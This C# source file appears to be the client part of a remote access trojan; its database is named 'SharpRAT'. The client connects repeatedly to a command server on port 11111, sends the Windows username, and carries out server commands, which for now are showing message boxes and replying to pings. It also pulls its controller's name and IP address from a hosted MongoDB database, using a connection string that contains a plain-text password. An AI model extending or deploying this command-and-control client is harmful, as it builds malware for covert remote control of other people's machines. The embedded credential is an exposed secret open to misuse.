using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using MongoDB.Bson;
using MongoDB.Bson.IO;
using MongoDB.Driver;
using Newtonsoft.Json.Linq;

namespace Client.Client
{
    internal class SocketClient
    {
        bool bNameSent = false;
        private Socket serverSocket;

        public Socket GetServerSocket()
        {
            return serverSocket;
        }

        private bool SendName()
        {
            serverSocket.Send(Encoding.ASCII.GetBytes("<CMD=NAME>" + WindowsHelper.GetUsername() + "<EOF>"));
            return true;
        }

        private void ParseData(string data)
        {
            string tempString = data.Replace("<EOF>", "");

            if (tempString.StartsWith("<CMD=MSGBOX>"))
            {
                tempString = tempString.Replace("<CMD=MSGBOX>", "");
                Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
            }
            else if(tempString.StartsWith("<PING>"))
            {
                serverSocket.Send(Encoding.ASCII.GetBytes(tempString));
            }
        }

        public void ExecuteClient()
        {
            while (true)
            {
                try
                {
                    MongoFetch();
                    // Connect to server, currently localhost and port 11111.
                    IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                    IPAddress ipAddress = ipHost.AddressList[0];
                    IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 11111);

                    // TCP/IP Socket.
                    serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                    
                    try
                    {
                        // Connect to server.
                        serverSocket.Connect(localEndPoint);

                        if (!bNameSent)
                            bNameSent = SendName();

                        while (serverSocket.Connected)
                        {
                            // Data buffer
                            byte[] messageReceived = new byte[1024];
                            int byteRecv = serverSocket.Receive(messageReceived);
                            ParseData(Encoding.ASCII.GetString(messageReceived, 0, byteRecv));
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.ToString());
                    }

                    if (!serverSocket.Connected)
                        bNameSent = false;
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
        }
        public void MongoFetch()
        {
            /*
            string test = @"{
            '_id:':ObjectId('')
            'AdminName':'test',
            'CurrentIp':'ip'
            }";
            */
            var client = new MongoClient(
                    "mongodb+srv://Snutri:tCbJtoBWdEHCOEjS@sharprat.t4wds.mongodb.net/SharpRAT?retryWrites=true&w=majority");
            var db = client.GetDatabase("SharpRAT");
            
            var connections = db.GetCollection<BsonDocument>("connections");
            var list = connections.Find(new BsonDocument());
            var firstDocument = connections.Find(new BsonDocument()).FirstOrDefault();
            //System.Diagnostics.Debug.WriteLine(firstDocument.ToString());
            var test = firstDocument.ToString();
            var details = JObject.Parse(test);
            System.Diagnostics.Debug.WriteLine(string.Concat("Hi ", details["AdminName"], " " + details["CurrentIp"]));


        }
    }
}
